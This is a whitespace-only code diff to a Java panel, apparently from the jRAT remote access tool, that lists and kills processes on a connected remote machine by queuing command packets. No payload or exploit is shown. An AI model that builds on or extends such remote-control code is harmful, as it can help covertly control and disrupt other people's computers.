@@ -1,6 +1,5 @@
 package pro.jrat.ui.panels;
 
-
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 
@@ -20,7 +19,6 @@ import pro.jrat.packets.outgoing.Packet20KillProcess;
 import pro.jrat.packets.outgoing.Packet38RunCommand;
 import pro.jrat.ui.renderers.table.ProcessTableRenderer;
 import pro.jrat.utils.Utils;
-
 
 @SuppressWarnings("serial")
 public class PanelControlRemoteProcess extends PanelControlParent {
@@ -59,13 +57,13 @@ public class PanelControlRemoteProcess extends PanelControlParent {
 					} else {
 						process = model.getValueAt(table.getSelectedRow(), 1).toString();
 					}
-					
+
 					while (model.getRowCount() > 0) {
 						model.removeRow(0);
 					}
-					
-					sl.addToSendQueue(new Packet20KillProcess(process));				
-					
+
+					sl.addToSendQueue(new Packet20KillProcess(process));
+
 					sl.addToSendQueue(new Packet19ListProcesses());
 				}
 			}
